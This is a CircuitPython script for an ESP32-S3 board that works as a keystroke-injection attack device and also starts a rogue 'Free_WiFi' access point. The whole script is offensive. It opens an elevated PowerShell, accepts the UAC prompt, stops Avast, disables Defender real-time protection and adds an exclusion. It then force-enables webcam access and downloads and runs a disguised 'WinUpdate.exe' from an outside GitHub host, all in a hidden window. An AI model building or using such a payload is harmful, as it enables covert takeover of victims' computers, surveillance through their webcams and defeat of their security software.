import time
import usb_hid
import wifi
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

# ======================================================
# FAKE AP
# ======================================================
SSID = "Free_WiFi"
PASSWORD = "12345678"

try:
    wifi.radio.start_ap(ssid=SSID, password=PASSWORD)
    print(f"✅ Fake AP '{SSID}' started!")
    print(f"📶 ESP32-S3 IP: {wifi.radio.ipv4_address_ap}")
except Exception as e:
    print(f"⚠️ Fake AP failed: {e}")

# ======================================================
# HID KEYBOARD (Pehle wala stable logic)
# ======================================================
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

time.sleep(5)

# Run Box Open
kbd.press(Keycode.GUI, Keycode.R)
kbd.release_all()
time.sleep(1.0)

# PowerShell (Admin)
layout.write("powershell")
time.sleep(0.5)

# Admin Mode Elevation
kbd.press(Keycode.CONTROL, Keycode.SHIFT)
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(2.5)

# UAC Accept
kbd.press(Keycode.ALT, Keycode.Y)
kbd.release_all()
time.sleep(2.5)

# Webcam Allow
allow_webcam = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\" /v Value /t REG_SZ /d Allow /f"

# GitHub Links
exe_link = "https://github.com/Abdullahkhan1212/WinUpdate-Project/releases/download/WinUpdate-v1.2/WinUpdate.exe"
config_link = "https://github.com/Abdullahkhan1212/WinUpdate-Project/raw/refs/heads/main/config.json"

# Antivirus Bypass
av_bypass = "stop-process -name avast* -force -erroraction silentlycontinue; stop-service -name avast* -force -erroraction silentlycontinue; Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"

# Payload Command (Window Band)
payload_command = f"powershell -WindowStyle Hidden -Command \"{av_bypass}; {allow_webcam}; Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue; iwr '{exe_link}' -OutFile $env:TEMP\\WinUpdate.exe; iwr '{config_link}' -OutFile $env:TEMP\\config.json; start $env:TEMP\\WinUpdate.exe\"; exit"

layout.write(payload_command)
time.sleep(0.5)
kbd.press(Keycode.ENTER)
kbd.release_all()

# Keep alive
while True:
    time.sleep(1)